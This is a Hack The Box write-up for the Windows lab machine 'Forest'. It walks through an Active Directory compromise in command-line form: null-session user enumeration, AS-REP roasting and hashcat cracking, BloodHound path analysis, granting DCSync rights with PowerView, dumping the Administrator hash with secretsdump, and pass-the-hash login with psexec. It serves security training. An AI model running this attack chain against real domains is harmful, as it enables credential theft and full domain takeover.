---
layout: page
title: Forest - Hack The Box Writeup
subtitle: Unauthenticated user enumeration, AS-REP roasting, BloodHound path analysis, and DCSync rights exploitation on Windows Active Directory.
permalink: /ctf/writeups/hackthebox/forest/
platform: HackTheBox
machine_name: Forest
difficulty: Hard
os: Windows
date: 2026-06-26
---

## 🖥️ Machine Information
* **IP Address**: `10.10.10.161`
* **OS**: Windows Server 2016
* **Domain**: `HTB.LOCAL`
* **Difficulty**: Hard
* **Vulnerability Focus**: AS-REP Roasting / Active Directory ACL Abuse / DCSync

---

## 🔍 Enumeration & User Harvesting

We begin by querying the domain controller over RPC using null credentials:
```bash
rpcclient -U "" -N 10.10.10.161 -c "enumdomusers"
# Discovered domain users: svc-alfresco, andy, mark, santi, sebastien, lucinda
```

We save the gathered usernames into a file `users.txt` and perform **AS-REP Roasting** (checking for users with Kerberos preauthentication disabled):
```bash
GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -no-pass
# Successfully retrieved AS-REP hash for svc-alfresco
```

We crack the hash offline using Hashcat:
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
# Cracked password: s3rvice
```

---

## 🗺️ BloodHound Path Analysis

Using the credentials `svc-alfresco:s3rvice`, we run the BloodHound ingestor to analyze AD relationships and permissions:
```bash
python3 bloodhound.py -u svc-alfresco -p s3rvice -d htb.local -c All -dc-ip 10.10.10.161
```

Analyzing the path to Domain Admin in BloodHound reveals the following escalation route:
1. `svc-alfresco` is a member of the **Account Operators** group.
2. Members of Account Operators have write access to modify groups, including the **Exchange Windows Permissions** group.
3. The Exchange Windows Permissions group has `WriteDACL` rights over the Domain object (`htb.local`).
4. This permission allows members to write new Access Control Entries (ACEs) on the domain object, enabling them to grant `DCSync` rights to any domain account.

---

## 🚀 Exploitation & Domain Takeover

We log in via WinRM or execute remote powershell commands to abuse these privileges:
```powershell
# Import PowerView module to modify DACLs
Import-Module .\PowerView.ps1

# Grant DCSync permissions to svc-alfresco on the domain root
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
```

Once DCSync rights are granted, we extract the Domain Administrator's NTLM password hash using Impacket's `secretsdump`:
```bash
secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
# Administrator NTLM hash: 32693b11e6aa90eb43d32c72a07ceea6
```

We log in as Domain Administrator using Pass-the-Hash:
```bash
psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
# Target authenticated as NT AUTHORITY\SYSTEM
```
 We read the domain flags and confirm full takeover.
